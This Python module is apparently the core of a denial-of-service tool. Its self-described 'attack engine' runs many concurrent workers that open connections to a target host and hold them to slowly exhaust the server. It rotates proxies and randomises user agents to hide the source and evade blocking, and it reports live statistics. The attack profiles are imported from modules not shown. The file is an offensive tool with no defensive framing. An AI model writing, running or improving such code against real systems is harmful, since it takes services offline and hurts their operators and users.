"""Asynchronous attack engine and live statistics."""

from __future__ import annotations

import asyncio
import json
import random
import ssl
import sys
import time

from . import conn
from .config import Config
from .profiles import PROFILES
from .proxies import ProxyPool
from .stats import Stats, human_size


class AttackEngine:
    """Spawns ``concurrency`` workers that slowly consume connections."""

    def __init__(self, config: Config, stop: asyncio.Event):
        self.config = config
        self.stop = stop
        self.stats = Stats()
        self._pool = (
            ProxyPool(
                config.proxies,
                config.rotate_proxies,
                max_failures=config.proxy_max_failures,
            )
            if config.proxies
            else None
        )

    async def run(self) -> None:
        workers = [asyncio.create_task(self._worker(i)) for i in range(self.config.concurrency)]
        reporter = asyncio.create_task(self._report())
        try:
            if self.config.duration > 0:
                try:
                    await asyncio.wait_for(self.stop.wait(), timeout=self.config.duration)
                except TimeoutError:
                    pass  # time's up
            else:
                await self.stop.wait()
        finally:
            self.stop.set()

        # Give workers a grace period to observe the stop flag, then cancel.
        await asyncio.wait(workers, timeout=2.0)
        for task in workers:
            if not task.done():
                task.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        reporter.cancel()
        await asyncio.gather(reporter, return_exceptions=True)

    async def _worker(self, idx: int) -> None:
        config = self.config
        last_fail = 0.0
        while not self.stop.is_set():
            proxy = self._pool.next() if self._pool else None
            if self._pool is not None and proxy is None:
                await asyncio.sleep(1.0)
                continue
            ua = random.choice(config.user_agents) if config.user_agents else "Mozilla/5.0"
            writer = None
            try:
                reader, writer = await conn.open_connection(
                    config.host, config.port, config=config, proxy=proxy
                )
                self.stats.connections += 1
                self.stats.active += 1
                self.stats.peak_active = max(self.stats.peak_active, self.stats.active)
                last_fail = 0.0

                await PROFILES[config.mode]().run(reader, writer, config, ua, self.stats, self.stop)
                self.stats.completed += 1
            except asyncio.CancelledError:
                raise
            except (TimeoutError, ConnectionError, OSError, ssl.SSLError) as exc:
                # Only report failures that are likely proxy-related
                # (connection errors before establishing connection are
                # often proxy issues; timeouts could be proxy or target).
                if (
                    proxy is not None
                    and self._pool is not None
                    and isinstance(exc, (ConnectionError, OSError))
                ):
                    self._pool.report_failure(proxy)
                self.stats.errors += 1
                if config.verbose:
                    print(f"  [w{idx}] {type(exc).__name__}: {exc}", flush=True)
                now = time.monotonic()
                if now - last_fail < 0.25:
                    await asyncio.sleep(0.3)  # back off a tight failure loop
                last_fail = now
            finally:
                if writer is not None:
                    try:
                        writer.close()
                        await writer.wait_closed()
                    except OSError:
                        pass
                    self.stats.active = max(0, self.stats.active - 1)

    async def _report(self) -> None:
        config = self.config
        stats = self.stats
        last_time = time.monotonic()
        last_sent = 0
        try:
            while True:
                await asyncio.sleep(config.stats_interval)
                now = time.monotonic()
                dt = now - last_time or 1e-9
                sent_rate = (stats.bytes_sent - last_sent) / dt
                last_time, last_sent = now, stats.bytes_sent
                uptime = now - stats.start

                payload = {
                    "connections": stats.connections,
                    "active": stats.active,
                    "peak_active": stats.peak_active,
                    "completed": stats.completed,
                    "errors": stats.errors,
                    "bytes_sent": stats.bytes_sent,
                    "bytes_received": stats.bytes_received,
                    "sent_bytes_per_sec": round(sent_rate, 1),
                    "uptime": round(uptime, 1),
                }

                if config.json_output:
                    print(json.dumps(payload), flush=True)
                elif not config.quiet:
                    line = (
                        f"\rthm | conns={stats.connections} open={stats.active} "
                        f"done={stats.completed} err={stats.errors} | "
                        f"sent {human_size(stats.bytes_sent)} "
                        f"@{human_size(sent_rate)}/s | "
                        f"recv {human_size(stats.bytes_received)} | "
                        f"{int(uptime // 60)}:{int(uptime % 60):02d}"
                    )
                    sys.stdout.write(line.ljust(110))
                    sys.stdout.flush()
        except asyncio.CancelledError:
            pass
        finally:
            if not config.json_output and not config.quiet:
                sys.stdout.write("\n")
                sys.stdout.flush()
